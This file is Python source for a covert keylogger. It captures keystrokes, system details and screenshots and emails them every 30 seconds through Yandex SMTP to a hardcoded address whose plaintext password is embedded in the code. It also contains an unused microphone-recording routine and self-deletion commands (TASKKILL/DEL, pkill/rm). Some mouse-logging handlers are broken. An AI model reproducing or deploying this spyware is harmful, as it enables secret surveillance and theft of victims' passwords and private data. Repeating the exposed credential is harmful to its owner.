import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.msgRoot = MIMEMultipart('related')
        self.msgRoot['Subject'] = "konu"
        self.msgRoot['From'] = "bycerannn@yandex.com"
        self.msgRoot['To'] = "bycerannn@yandex.com"
    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password):
        s = smtplib.SMTP_SSL('smtp.yandex.com.tr:465')
        s.ehlo()
        s.login("bycerannn@yandex.com", "1998-949")
        s.sendmail("bycerannn@yandex.com", "bycerannn@yandex.com", self.msgRoot.as_string())

    def report(self):
        
        #self.microphone()
        msgtxt = MIMEText(self.log, 'plain', 'utf-8')
        self.msgRoot.attach(msgtxt)
        self.screenshot()
        self.send_mail(self.email, self.password,)
        self.log = ""
        self.msgRoot = MIMEMultipart('related')
        self.msgRoot['Subject'] = "konu"
        self.msgRoot['From'] = "bycerannn@yandex.com"
        self.msgRoot['To'] = "bycerannn@yandex.com"
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def microphone(self):
        fs = 44100
        seconds = 10
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        #self.send_mail(email="bycerannn@yandex.com", password="1998-949", message=obj)

    def screenshot(self):

        img = pyscreenshot.grab()
        img.save("img.png")
        with open("img.png" ,'rb') as f: 
            l = f.read()
        msgImg = MIMEImage(l, 'png')
        msgImg.add_header('Content-ID', '<image1>')
        msgImg.add_header('Content-Disposition', 'inline', filename="img.png")
        self.msgRoot.attach(msgImg)
        
       


    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')

        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " +  os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('File is close.')


email_address = "bycerannn@yandex.com"
password = "1998-949"

keylogger = KeyLogger(30, email_address, password)
keylogger.run()
